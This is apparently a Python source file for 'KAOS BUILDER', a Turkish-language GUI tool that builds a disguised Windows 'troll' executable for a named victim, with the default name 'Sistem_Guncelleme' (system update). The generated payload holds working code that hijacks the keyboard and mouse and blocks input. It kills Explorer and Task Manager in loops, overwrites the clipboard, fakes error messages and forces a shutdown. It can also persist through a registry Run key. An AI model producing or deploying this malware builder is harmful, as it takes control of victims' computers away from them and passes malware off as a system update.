import tkinter as tk
from tkinter import messagebox
import os, subprocess, sys, threading, multiprocessing, shutil, random, time

# --- GÖRSEL TEMA ---
BG_COLOR = "#121212"
ACCENT = "#00FF99"


def get_payload_content(selections, delays, startups, name):
    # Fonksiyon listesi (Tam 40 Özellik)
    funcs = [
        "random_mouse", "crazy_cursor", "caps_lock_spam", "backspace_spam", "enter_spam",
        "hide_taskbar", "monitor_sleep", "open_cd_tray", "minimize_windows", "rotate_screen_prank",
        "system_beep_spam", "speak_insults", "volume_max", "notepad_spam", "calculator_spam",
        "website_opener", "create_desktop_files", "clipboard_hijack", "kill_explorer", "fake_error_msg",
        "keyboard_ghost", "wind_spam", "brightness_party", "folder_spam", "taskmgr_kill",
        "alt_tab_spam", "mouse_invert", "space_spam", "random_shutdown_timer", "mute_unmute",
        "screen_glitch", "color_invert_prank", "swap_mouse_buttons", "empty_trash", "block_input_temp",
        "cmd_spam", "paint_spam", "close_active_window", "zoom_in_out", "low_battery_fake"
    ]

    active_features = ""
    any_startup = any(startups)

    for i, selected in enumerate(selections):
        if selected:
            delay = delays[i] if (i < len(delays) and delays[i]) else "1.0"
            active_features += f"    threading.Thread(target={funcs[i]}, args=({delay},), daemon=True).start()\n"

    startup_logic = ""
    if any_startup:
        startup_logic = f"""
    try:
        import shutil, winreg
        app_path = os.path.realpath(sys.argv[0])
        dist_path = os.path.join(os.environ['APPDATA'], "{name}.exe")
        if not os.path.exists(dist_path):
            shutil.copy2(app_path, dist_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(key, "{name}", 0, winreg.REG_SZ, dist_path)
            winreg.CloseKey(key)
    except: pass
"""

    return f"""
import os, time, ctypes, random, threading, webbrowser, shutil, sys
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

# --- TROL FONKSİYONLARI ---
def random_mouse(d):
    while True: user32.SetCursorPos(random.randint(0, user32.GetSystemMetrics(0)), random.randint(0, user32.GetSystemMetrics(1))); time.sleep(float(d))
def crazy_cursor(d):
    while True:
        p = ctypes.wintypes.POINT(); user32.GetCursorPos(ctypes.byref(p))
        user32.SetCursorPos(p.x + random.randint(-20,20), p.y + random.randint(-20,20)); time.sleep(float(d))
def caps_lock_spam(d):
    while True: user32.keybd_event(0x14, 0, 0, 0); user32.keybd_event(0x14, 0, 2, 0); time.sleep(float(d))
def backspace_spam(d):
    while True: user32.keybd_event(0x08, 0, 0, 0); user32.keybd_event(0x08, 0, 2, 0); time.sleep(float(d))
def enter_spam(d):
    while True: user32.keybd_event(0x0D, 0, 0, 0); user32.keybd_event(0x0D, 0, 2, 0); time.sleep(float(d))
def hide_taskbar(d): user32.ShowWindow(user32.FindWindowW("Shell_TrayWnd", None), 0)
def monitor_sleep(d):
    while True: time.sleep(float(d)); user32.SendMessageW(0xFFFF, 0x0112, 0xF170, 2)
def open_cd_tray(d):
    while True: 
        try: ctypes.windll.winmm.mciSendStringW("set cdaudio door open", None, 0, 0); time.sleep(float(d))
        except: pass
def minimize_windows(d):
    while True: time.sleep(float(d)); user32.keybd_event(0x5B, 0, 0, 0); user32.keybd_event(0x44, 0, 0, 0); user32.keybd_event(0x5B, 0, 2, 0); user32.keybd_event(0x44, 0, 2, 0)
def rotate_screen_prank(d): pass
def system_beep_spam(d):
    while True: user32.MessageBeep(0xFFFFFFFF); time.sleep(float(d))
def speak_insults(d):
    while True: os.system('powershell -Command "Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak(\\'Windows found a critical error!\\');"'); time.sleep(float(d))
def volume_max(d):
    while True: 
        for _ in range(50): user32.keybd_event(0xAF, 0, 0, 0); user32.keybd_event(0xAF, 0, 2, 0)
        time.sleep(float(d))
def notepad_spam(d):
    while True: os.system("start notepad.exe"); time.sleep(float(d))
def calculator_spam(d):
    while True: os.system("start calc.exe"); time.sleep(float(d))
def website_opener(d):
    while True: webbrowser.open("https://www.google.com/search?q=how+to+fix+virus"); time.sleep(float(d))
def create_desktop_files(d):
    p = os.path.join(os.environ['USERPROFILE'], 'Desktop')
    while True:
        try: open(os.path.join(p, f"HACK_{{random.randint(0,999)}}.txt"), 'w').write("LOL"); time.sleep(float(d))
        except: pass
def clipboard_hijack(d):
    while True: os.system('echo SENI GORUYORUM | clip'); time.sleep(float(d))
def kill_explorer(d):
    while True: time.sleep(float(d)); os.system("taskkill /f /im explorer.exe")
def fake_error_msg(d):
    while True: user32.MessageBoxW(0, "System Failure Detected!", "Kernel Error", 0x10); time.sleep(float(d))

# --- YENI EKLENEN 20 OZELLIK ---
def keyboard_ghost(d):
    while True: char = random.choice([0x41, 0x42, 0x43]); user32.keybd_event(char, 0, 0, 0); time.sleep(float(d))
def wind_spam(d): # Win+D (Masaüstü/Pencere kavgası)
    while True: user32.keybd_event(0x5B, 0, 0, 0); user32.keybd_event(0x44, 0, 0, 0); user32.keybd_event(0x44, 0, 2, 0); user32.keybd_event(0x5B, 0, 2, 0); time.sleep(float(d))
def brightness_party(d):
    while True: os.system(f"powershell (Get-WmiObject -Namespace root/WMI -Class WmiMonitorBrightnessMethods).WmiSetBrightness(1,{{random.randint(0,100)}})"); time.sleep(float(d))
def folder_spam(d):
    while True: os.makedirs(f"TR_{{random.randint(0,9999)}}", exist_ok=True); time.sleep(float(d))
def taskmgr_kill(d):
    while True: os.system("taskkill /f /im taskmgr.exe"); time.sleep(0.5)
def alt_tab_spam(d):
    while True: user32.keybd_event(0x12, 0, 0, 0); user32.keybd_event(0x09, 0, 0, 0); time.sleep(0.1); user32.keybd_event(0x09, 0, 2, 0); user32.keybd_event(0x12, 0, 2, 0); time.sleep(float(d))
def mouse_invert(d):
    while True:
        p = ctypes.wintypes.POINT(); user32.GetCursorPos(ctypes.byref(p))
        user32.SetCursorPos(p.x - 5, p.y - 5); time.sleep(float(d))
def space_spam(d):
    while True: user32.keybd_event(0x20, 0, 0, 0); user32.keybd_event(0x20, 0, 2, 0); time.sleep(float(d))
def random_shutdown_timer(d):
    time.sleep(120); os.system("shutdown /s /t 60 /c \\'Sistem asiri isindi!\\'")
def mute_unmute(d):
    while True: user32.keybd_event(0xAD, 0, 0, 0); time.sleep(float(d))
def screen_glitch(d): pass # Windows API gerektirir, kisa sureli ekran dondurma
def color_invert_prank(d): pass # Magnifier API gerekir
def swap_mouse_buttons(d):
    user32.SwapMouseButton(True) # Mouse tuslarini ters cevirir
def empty_trash(d):
    while True: kernel32.SetFileAttributesW("C:\\\\$Recycle.Bin", 2); time.sleep(float(d))
def block_input_temp(d):
    while True: user32.BlockInput(True); time.sleep(0.5); user32.BlockInput(False); time.sleep(float(d))
def cmd_spam(d):
    while True: os.system("start cmd.exe /k echo ERROR"); time.sleep(float(d))
def paint_spam(d):
    while True: os.system("start mspaint.exe"); time.sleep(float(d))
def close_active_window(d):
    while True: user32.PostMessageW(user32.GetForegroundWindow(), 0x0010, 0, 0); time.sleep(float(d))
def zoom_in_out(d):
    while True: user32.keybd_event(0x5B, 0, 0, 0); user32.keybd_event(0xBB, 0, 0, 0); time.sleep(0.2); user32.keybd_event(0x5B, 0, 2, 0); time.sleep(float(d))
def low_battery_fake(d):
    while True: user32.MessageBoxW(0, "Battery Low! (2%)", "System", 0x30); time.sleep(float(d))

if __name__ == "__main__":
{startup_logic}
{active_features}
    while True: time.sleep(10)
"""


class ChaosBuilder:
    def __init__(self, root):
        self.root = root
        self.root.title("☣ KAOS BUILDER v4.0 ULTIMATE ☣")
        self.root.geometry("700x850")
        self.root.configure(bg=BG_COLOR)

        tk.Label(root, text="KAOS TROLL FACTORY", font=("Impact", 28), fg=ACCENT, bg=BG_COLOR).pack(pady=15)

        # Üst Ayar
        f_name = tk.Frame(root, bg=BG_COLOR)
        f_name.pack(pady=5)
        tk.Label(f_name, text="Kurban EXE İsmi:", fg="white", bg=BG_COLOR).pack(side="left")
        self.filename_entry = tk.Entry(f_name, width=25, font=("Arial", 10))
        self.filename_entry.insert(0, "Sistem_Guncelleme")
        self.filename_entry.pack(side="left", padx=5)

        # Başlıklar
        h_frame = tk.Frame(root, bg=BG_COLOR)
        h_frame.pack(fill="x", padx=15)
        tk.Label(h_frame, text="Trol Özelliği", fg=ACCENT, bg=BG_COLOR, font=("Arial", 10, "bold"), width=35,
                 anchor="w").pack(side="left")
        tk.Label(h_frame, text="Başlat (B)", fg=ACCENT, bg=BG_COLOR, font=("Arial", 9, "bold")).pack(side="right",
                                                                                                     padx=5)
        tk.Label(h_frame, text="Hız (sn)", fg=ACCENT, bg=BG_COLOR, font=("Arial", 9, "bold")).pack(side="right",
                                                                                                   padx=20)

        # Kaydırma Alanı
        c_frame = tk.Frame(root, bg=BG_COLOR)
        c_frame.pack(fill="both", expand=True, padx=5, pady=5)
        self.canvas = tk.Canvas(c_frame, bg=BG_COLOR, highlightthickness=0)
        self.sb = tk.Scrollbar(c_frame, orient="vertical", command=self.canvas.yview)
        self.s_frame = tk.Frame(self.canvas, bg=BG_COLOR)
        self.s_frame.bind("<Configure>", lambda e: self.canvas.configure(scrollregion=self.canvas.bbox("all")))
        self.canvas.create_window((0, 0), window=self.s_frame, anchor="nw")
        self.canvas.configure(yscrollcommand=self.sb.set)
        self.canvas.pack(side="left", fill="both", expand=True)
        self.sb.pack(side="right", fill="y")

        self.features = [
            "Mouse: Isinlanma", "Mouse: Titreme", "Klavye: CapsLock", "Klavye: Backspace", "Klavye: Enter",
            "Sistem: Gorev Cubugu", "Ekran: Uyku Modu", "Donanim: CD-ROM", "Sistem: Pencereler",
            "Ekran: Dondurme", "Ses: Hata Bipi", "Ses: TTS Konusma", "Ses: Max Ses", "Spam: Notepad",
            "Spam: Hesap Makinesi", "Spam: Web Sitesi", "Spam: Masaustu Dosya", "Pano: Clipboard",
            "Kritik: Explorer", "Fake: Error Box", "Hayalet: Klavye", "Kabus: Win+D Spam", "Isik: Parlaklik",
            "Spam: Klasor", "Kritik: TaskMgr Kill", "Kabus: Alt+Tab", "Mouse: Ters Yon", "Klavye: Space Spam",
            "Sistem: Kapanis Zamanlayici", "Ses: Sessize Al/Ac", "Efekt: Screen Glitch", "Efekt: Renk Tersten",
            "Mouse: Tuslari Degistir", "Sistem: Cop Kutusu", "Kritik: Giris Blokla", "Spam: CMD",
            "Spam: Paint", "Sistem: Pencere Kapat", "Ekran: Zoom In/Out", "Fake: Dusuk Pil"
        ]

        self.vars, self.delay_entries, self.startup_vars = [], [], []

        for f in self.features:
            row = tk.Frame(self.s_frame, bg=BG_COLOR)
            row.pack(fill="x", pady=2)
            v = tk.IntVar()
            tk.Checkbutton(row, text=f, variable=v, bg=BG_COLOR, fg="white", selectcolor="#333", width=35,
                           anchor="w").pack(side="left")
            self.vars.append(v)
            sv = tk.IntVar();
            tk.Checkbutton(row, variable=sv, bg=BG_COLOR, selectcolor="#444").pack(side="right", padx=28)
            self.startup_vars.append(sv)
            de = tk.Entry(row, width=8);
            de.insert(0, "1.0");
            de.pack(side="right", padx=5)
            self.delay_entries.append(de)

        tk.Button(root, text="☣ KAOSU OLUSTUR ☣", command=self.build_exe, bg=ACCENT, font=("Arial", 14, "bold"),
                  height=2).pack(pady=20)

    def find_python(self):
        for cmd in ["py", "python", "python3"]:
            if shutil.which(cmd): return cmd
        return None

    def build_exe(self):
        name = self.filename_entry.get().strip() or "Payload"
        sels = [bool(v.get()) for v in self.vars]
        delays = [e.get().replace(',', '.') for e in self.delay_entries]
        startups = [bool(sv.get()) for sv in self.startup_vars]
        if not any(sels): return messagebox.showwarning("Hata", "Ozelik sec!")
        threading.Thread(target=self.run_build, args=(name, sels, delays, startups), daemon=True).start()

    def run_build(self, name, sels, delays, startups):
        code = get_payload_content(sels, delays, startups, name)
        temp_file = "temp_payload.py"
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(code)
        py_cmd = self.find_python()
        icon_path = "icon.png"
        icon_cmd = f'--icon="{icon_path}"' if os.path.exists(icon_path) else ""
        try:
            full_cmd = f'{py_cmd} -m PyInstaller --onefile --noconsole {icon_cmd} --name "{name}" "{temp_file}"'
            process = subprocess.Popen(full_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       creationflags=0x08000000)
            process.communicate()
            if process.returncode == 0:
                for f in [temp_file, f"{name}.spec"]:
                    if os.path.exists(f): os.remove(f)
                shutil.rmtree("build", ignore_errors=True)
                os.startfile(os.path.join(os.getcwd(), "dist"))
                messagebox.showinfo("Basarili", f"'{name}.exe' hazir!")
        except Exception as e:
            messagebox.showerror("Hata", str(e))


if __name__ == "__main__":
    multiprocessing.freeze_support()
    root = tk.Tk();
    app = ChaosBuilder(root);
    root.mainloop()